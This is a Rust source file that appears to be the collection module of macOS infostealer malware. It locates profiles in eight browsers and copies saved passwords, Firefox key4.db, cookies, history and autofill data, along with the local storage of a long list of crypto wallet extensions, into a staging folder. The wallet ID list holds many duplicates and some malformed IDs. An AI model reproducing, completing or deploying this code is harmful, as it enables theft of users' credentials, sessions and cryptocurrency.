use crate::tools;
use std::path::Path;
use anyhow::{Result, Context};

pub struct Browsers {
    pub chrome_path: String,
    pub firefox_path: String,
    pub brave_path: String,
    pub edge_path: String,
    pub vivaldi_path: String,
    pub yandex_path: String,
    pub opera_path: String,
    pub opera_gx_path: String,
}

impl Browsers {
    pub fn new() -> Self {
        Browsers {
            chrome_path: "/Google/Chrome".to_string(),
            firefox_path: "/Firefox/Profiles".to_string(),
            brave_path: "/BraveSoftware/Brave-Browser".to_string(),
            edge_path: "/Microsoft Edge".to_string(),
            vivaldi_path: "/Vivaldi".to_string(),
            yandex_path: "/Yandex/YandexBrowser".to_string(),
            opera_path: "/com.operasoftware.Opera".to_string(),
            opera_gx_path: "/com.operasoftware.OperaGX".to_string(),
        }
    }

    pub fn extension_ids() -> Vec<&'static str> {
        vec![
            "nkbihfbeogaeaoehlefnkodbefgpgknn",
            "hnfanknocfeofbddgcijnmhnfnkdnaad",
            "egjidjbpglichdcondbcbdnbeeppgdph",
            "fdjamakpfbbddfjaooikfcpapjohcfmg",
            "bfnaelmomeimhlpmgjnjophhpkkoljpa",
            "inogffkifehjmjkojolhagpbmdjajfjf",
            "afbcbjpbpfadlkmhmclhkeeodmamcflc",
            "aeachknmefphepccionboohckonoeemg",
            "dnahimkjmphecfmphdplpidnpdbgihjm",
            "fhbohimaelbohpjbbldcngcnapndodjp",
            "hpglfhgfnhbgpjdenjgmdgoeiappafln",
            "ddjbpkjkbihpkkjoiidijondfnnilgbd",
            "ffnbelfdoeiohenkjibnmadjiehjhajb",
            "ljfoeinjpaedjfecbmggjgodbgkmjkjk", // Trezor Wallet
            "fhbohimaelbohpjbbldcngcnapndodjp", // Sollet Wallet
            "agofbccfdbggmjhbjligajffaedmpfi", // BitKeep
            "oblahjcienboiocobpfmpkhgbilacbof", // MyEtherWallet (MEW)
            "dmkamcknogkgcdfhhbddcghachkejeap", // Keplr Wallet
            "eogjbkambcobpejogjednkhnkdlpjkgf", // ZenGo Wallet
            "ffnbelfdoeiohenkjibnmadjiehjhajb", // FoxWallet
            "nkpfkohfaabomajpmcikkgipnddjbjlm", // XDEFI Wallet
            "cjfkaebgdjmgkknhmeddmbjfkkllcfma", // Rabby Wallet
            "cgjclchllmlobfdhpdfbfblakllcdcp", // SafePal Wallet
            "cgpbghdcejifbdmicolodockpdpejkm", // D'CENT Wallet
            "ekpbnlianmehonjglfliphieffnpagjk", // Portis
            "bhemafnepdahjhdibdejjdojplpanpjm", // Clover Wallet
            "eobpgiikknjeagdbnljopepfkfgjcom", // Talisman Wallet
            "cefoeaflfeaogknfendclmchngnpadh", // MathWallet (duplicate corrected)
            "cegnkklhnkfhpgpgdddpbglgbfjcbka", // Cyano Wallet
            "mfibgodchngikcneecnpcenooljdfcd", // Opera Crypto Wallet
            "njehdbnfdjbclbggngdihjghpknebfn", // Polkadot-JS
            "kgpidhfbnidjcldpngdonkekmpkgihke", // Solflare Wallet
            "cegmkloiabeockglkffemjljgbbannn", // Ellipal Wallet
            "kjklkfoolpolbnklekmicilkhigclekd", // AlphaWallet
            "bnnkeaggkakalmkbfbcglpggdobgfoa", // ZelCore
            "plnnhafklcflphmidggcldodbdennyg", // AT.Wallet
            "hjbkalghaiemehgdhaommgaknjmbnmf", // Loopring Wallet
            "dljopojhfmopnmnfocjmaiofbbifkbfb", // Halo Wallet
            "pghngobfhkmclhfdbemffnbihphmpcgb", // Pillar Wallet
            "keoamjnbgfgpkhbgmopocnkpnjkmjdd", // Ambire Wallet
            "nhdllgjlkgfnoianfjnbmcjmhdelknbm", // Blocto Wallet
            "fgdbiimlobodfabfjjnpefkafofcojmb", // Hashpack Wallet
            "blpcdojejhnenclebgmmbokhnccefgjm", // Defiat Wallet
            "kjbhfnmamllpocpbdlnpjihckcoidje", // Opera Crypto
            "efnhgnhicmmnchpjldjminakkdnidbop", // Titan Wallet
            "kmccchlcjdojdokecblnlaclhobaclj", // ONE Wallet
            "bpcedbkgmedfpdpcabaghjbmhjoabgmh", // MewCX
            "aipfkbcoemjllnfpblejkiaogfpocjba", // Frontier Wallet
            "nmngfmokhjdbnmdlajibgniopjpckpo", // ChainX Wallet
            "nehbcjigfgjgehlgimkfkknemhnhpjo", // Bifrost Wallet
            "ejbalbakoplchlghecdalmeeeajnimhm", // MetaMask
            "ofhbbkphhbklhfoeikjpcbhemlocgigb", // Coinbase Wallet
            "lefigjhibehgfelfgnjcoodflmppomko", // Trust Wallet
            "alncdjedloppbablonallfbkeiknmkdi", // Crypto.com DeFi Wallet
            "bfnaelmomeimhlpmgjnjophhpkkoljpa", // Phantom
            "lpbfigbdccgjhflmccincdaihkmjjfgo", // Guarda Wallet
            "achbneipgfepkjolcccedghibeloocbg", // MathWallet
            "fdgodijdfciiljpnipkplpiogcmlbmhk", // Coin98
            "ljfoeinjpaedjfecbmggjgodbgkmjkjk", // Nami Wallet
            "mcbpblocgmgfnpjjppndjkmgjaogfceg", // Binance Wallet
            "geceibbmmkmkmkbojpegbfakenjfoenal", // Exodus
            "ibnejdfjmmkpcnlpebklmnkoeoihofec", // Atomic Wallet
            "ffnbelfdoeiohenkjibnmadjiehjhajb", // Yoroi Wallet
            "kjebfhglflciofebmojinmlmibbmcmkdo", // Trezor Wallet
            "jaoafjlleohakjimhphimldpcldhamjp", // Sollet Wallet
            "blnieiiffboillknjnepogjhkgnoapac", // BitKeep
            "odbfpeeihdkbihmopkbjmoonfanlbfcl", // MyEtherWallet (MEW)
            "leibnlghpgpjigganjmbkhlmehlnaedn", // Keplr Wallet
            "hmnminpbnkpndojhkipgkmokcocmgllb", // ZenGo Wallet
            "bocpokimicclglpgehgiebilfpejmgjo", // FoxWallet
            "ljfoeinjpaedjfecbmggjgodbgkmjkjk", // XDEFI Wallet
            "ilajcdmbpocfmipjioonlmljbmljbfpj", // Rabby Wallet
            "hnmpcagpplmpfojmgmnngilcnanddlhb", // SafePal Wallet
            "odbfpeeihdkbihmopkbjmoonfanlbfcl", // D'CENT Wallet
            "ahkfhobdidabdlaphghgikhlpdbnodpa", // Portis
            "jihneinfbfkaopkpnifgbfdlfpnhgnko", // Clover Wallet
            "hpglfhgfnhbgpjdenjgmdgoeiappafln", // Talisman Wallet
            "cmeakgjggjdhccnmkgpjdnaefojkbgmb", // MathWallet (duplicate corrected)
            "ffabmkklhbepgcgfonabamgnjfjdbjoo", // Cyano Wallet
            "cdjkjpfjcofdjfbdojhdmlflffdafngk", // Opera Crypto Wallet
            "apicngpmdlmkkjfbmdhpjedieibfklkf", // Polkadot-JS
            "lhkfcaflljdcedlgkgecfpfopgebhgmb", // Solflare Wallet
            "omgopbgchjlaimceodkldgajioeebhab", // Ellipal Wallet
            "kehbljcfpanhajpidcmblpdnlphelaie", // AlphaWallet
            "lnehnlppemineeojdjkcpgoockkboohn", // ZelCore
            "kjebfhglflciofebmojinmlmibbmcmkdo", // AT.Wallet
            "hjebgbdpfgbcjdopfbbcpcjefcmhpdpn", // Loopring Wallet
            "pklfcgcfchhcokldoonkijijfpgmjilh", // Halo Wallet
            "lplmibmljignbdmkclofcackoolcfnhj", // Pillar Wallet
            "kibokekadkmfjfckkbgndphcjejhoial", // Ambire Wallet
            "nhdllgjlkgfnoianfjnbmcjmhdelknbm", // Blocto Wallet
            "kdfmmohbkjggjlmelhhmcgohadhdeijn", // Hashpack Wallet
            "blpcdojejhnenclebgmmbokhnccefgjm", // Defiat Wallet
            "kjbhfnmamllpocpbdlnpjihckcoidje", // Opera Crypto
            "aoilkoeledabkfogmczlbdfhbdkoggko", // Titan Wallet
            "jmchmkecamhbiokiopfpjjmfkpbbjjaf", // ONE Wallet
            "mgffkfbidcmcenlkgaebhoojfcegdndl", // MewCX
            "kdgecbhaddlgffpdffafpikmjekjflff", // Frontier Wallet
            "pfilbfecknpnlbcioakkpcmkfckpogeg", // ChainX Wallet
            "mehhoobkfknjlamaohobkhfnoheajlfi",  // Bifrost Wallet
        ]
    }

    pub fn collect_all_data(&self, temp_path: &str) -> Result<()> {
        self.collect_data_from_browser("Chrome", &self.chrome_path, temp_path)?;
        self.collect_data_from_browser("Firefox", &self.firefox_path, temp_path)?;
        self.collect_data_from_browser("Brave", &self.brave_path, temp_path)?;
        self.collect_data_from_browser("Edge", &self.edge_path, temp_path)?;
        self.collect_data_from_browser("Vivaldi", &self.vivaldi_path, temp_path)?;
        self.collect_data_from_browser("Yandex", &self.yandex_path, temp_path)?;
        self.collect_data_from_browser("Opera", &self.opera_path, temp_path)?;
        self.collect_data_from_browser("OperaGX", &self.opera_gx_path, temp_path)?;
        Ok(())
    }

    fn collect_data_from_browser(&self, browser_name: &str, browser_path: &str, temp_path: &str) -> Result<()> {
        let browser_path_home_directory = format!(
            "{}/Library/Application Support{}",
            tools::get_home_directory(),
            browser_path
        );
        let profiles = self.get_profiles(&browser_path_home_directory, browser_name)?;
        for profile in profiles {
            let mut profile_path_folder = format!("{}_{}", browser_name, profile);
             if browser_name == "OperaGX" {
                profile_path_folder = format!("{}/", browser_name);
            }

            let path_to_profile = format!("{}{}", browser_path_home_directory, profile);
            let path_to_save_profile_data = format!("{}/Browsers/{}", temp_path, profile_path_folder);
            tools::create_directory(&path_to_save_profile_data)?;

            self.collect_data_and_save(browser_name, &path_to_profile, &path_to_save_profile_data)?;
            Self::collect_local_extension_settings(&path_to_profile, &path_to_save_profile_data)?;
        }
        Ok(())
    }

    fn get_profiles(&self, browser_path: &str, browser_name: &str) -> Result< Vec<String> > {
        let mut profiles = Vec::new();
        if tools::file_exists(browser_path) {
            let entries = std::fs::read_dir(browser_path)
                .with_context(|| format!("Failed to read directory: {}", browser_path))?;
            for entry in entries {
                let entry = entry?;
                let full_path = entry.path();
                let is_directory = full_path.is_dir();

                if is_directory {
                    let entry_name = entry.file_name().to_string_lossy().to_string();
                    if browser_name == "Chrome" || browser_name == "Brave" || browser_name == "Edge" || browser_name == "Vivaldi" || browser_name == "Yandex" || browser_name == "Opera" {
                        if entry_name == "Default" || entry_name.starts_with("Profile ") {
                            profiles.push(format!("{}/", entry_name));
                        }
                    } else if browser_name == "Firefox" {
                         if entry_name.contains(".default-release") {
                            profiles.push(format!("{}/", entry_name));
                        }
                    }
                }
            }
        }
        Ok(profiles)
    }

    fn collect_data_and_save(&self, browser_name: &str, path_to_profile: &str, path_to_save: &str) -> Result<()> {
        let mut autofills_file_name = "Web Data";
        let mut history_file_name = "History";
        let mut cookies_file_name = "Cookies";
        let mut logins_passwords_file_name = "Login Data";

        if browser_name == "Firefox" {
            autofills_file_name = "formhistory.sqlite";
            history_file_name = "places.sqlite";
            cookies_file_name = "cookies.sqlite";
            logins_passwords_file_name = "logins.json";

            let key4_source_path = format!("{}/key4.db", path_to_profile);
            let key4_destination_path = format!("{}/Local State/", path_to_save);
            tools::copy_file_to_directory(&key4_source_path, &key4_destination_path)?;
        }

        let autofills_source_path = format!("{}/{}", path_to_profile, autofills_file_name);
        let autofills_destination_path = format!("{}/Autofills/", path_to_save);

        let history_source_path = format!("{}/{}", path_to_profile, history_file_name);
        let history_destination_path = format!("{}/History/", path_to_save);

        let cookies_source_path = format!("{}/{}", path_to_profile, cookies_file_name);
        let cookies_destination_path = format!("{}/Cookies/", path_to_save);

        let logins_source_path = format!("{}/{}", path_to_profile, logins_passwords_file_name);
        let logins_destination_path = format!("{}/Passwords/", path_to_save);

        tools::copy_file_to_directory(&autofills_source_path, &autofills_destination_path)?;
        tools::copy_file_to_directory(&history_source_path, &history_destination_path)?;
        tools::copy_file_to_directory(&cookies_source_path, &cookies_destination_path)?;
        tools::copy_file_to_directory(&logins_source_path, &logins_destination_path)?;

        Ok(())
    }

    fn collect_local_extension_settings(path_to_profile: &str, path_to_save: &str) -> Result<()> {
        let local_extension_settings_path = format!("{}/Local Extension Settings", path_to_profile);

        if tools::file_exists(&local_extension_settings_path) && Path::new(&local_extension_settings_path).is_dir() {
            let entries = std::fs::read_dir(&local_extension_settings_path)
                .with_context(|| format!("Failed to read directory: {}", local_extension_settings_path))?;

            for entry in entries {
                let entry = entry?;
                let full_path = entry.path();
                if full_path.is_dir() {
                    let entry_name = entry.file_name().to_string_lossy().to_string();
                     if Self::extension_ids().contains(&entry_name.as_str()) {
                        let save_path = format!("{}/Extensions/{}", path_to_save, entry_name);
                        tools::copy_directory_with_files(full_path.to_str().unwrap(), &save_path)?;
                    }
                }
            }
        }
        Ok(())
    }
} 